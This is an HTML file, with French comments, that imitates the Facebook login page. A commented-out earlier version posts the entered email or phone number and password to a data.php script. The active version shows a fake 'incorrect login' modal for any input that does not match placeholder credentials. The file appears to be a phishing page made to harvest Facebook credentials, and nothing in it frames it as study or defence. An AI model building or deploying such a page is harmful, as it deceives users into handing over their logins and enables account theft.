<!-- 
<!DOCTYPE html>
<html lang="en" translate="no">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>facebook</h1>
        </div>
        <div class="login-container">
            <div class="login-box">
                <form action="data.php" method="post">
                    <input type="text" id="username" name="username" required placeholder="Email or Phone number" required>
                    <input type="password" id="email" name="email" required placeholder="Password" required>
                    <button type="submit">Log In</button>
                    <a href="#" class="forgot-password">Forgotten password?</a>
                    <hr>
                    <button class="create-account" type="button">Create New Account</button>
                </form>
            </div>
        </div>
        <div class="footer">
            <p>Facebook © 2024</p>
        </div>
    </div>
</body>

</html> -->

<!DOCTYPE html>
<html lang="en" translate="no">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Styles pour le modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgb(0,0,0);
            background-color: rgba(0,0,0,0.4);
            padding-top: 60px;
        }

        .modal-content {
            background-color: #fefefe;
            margin: 5% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 300px;
            border-radius: 10px;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>facebook</h1>
        </div>
        <div class="login-container">
            <div class="login-box">
                <form id="loginForm" action="data.php" method="post">
                    <input type="text" id="username" name="username" required placeholder="Email or Phone number">
                    <input type="password" id="password" name="password" required placeholder="Password">
                    <button type="button" onclick="validateLogin()">Log In</button>
                    <a href="#" class="forgot-password">Forgotten password?</a>
                    <hr>
                    <button class="create-account" type="button">Create New Account</button>
                </form>
            </div>
        </div>
        <div class="footer">
            <p>Facebook © 2024</p>
        </div>
    </div>

    <!-- Modal -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <p>Information de connexion incorrecte</p>
        </div>
    </div>

    <script>
        // Fonction pour valider les informations de connexion
        function validateLogin() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Ici, ajoutez la logique pour vérifier les informations de connexion
            // Pour cet exemple, nous allons simplement afficher le modal pour démontrer
            if (username !== "correctUsername" || password !== "correctPassword") {
                showModal();
            }
        }

        // Fonction pour afficher le modal
        function showModal() {
            var modal = document.getElementById("myModal");
            modal.style.display = "block";
        }

        // Fonction pour fermer le modal
        function closeModal() {
            var modal = document.getElementById("myModal");
            modal.style.display = "none";
        }

        // Fermer le modal si l'utilisateur clique en dehors de celui-ci
        window.onclick = function(event) {
            var modal = document.getElementById("myModal");
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
    </script>
</body>

</html>
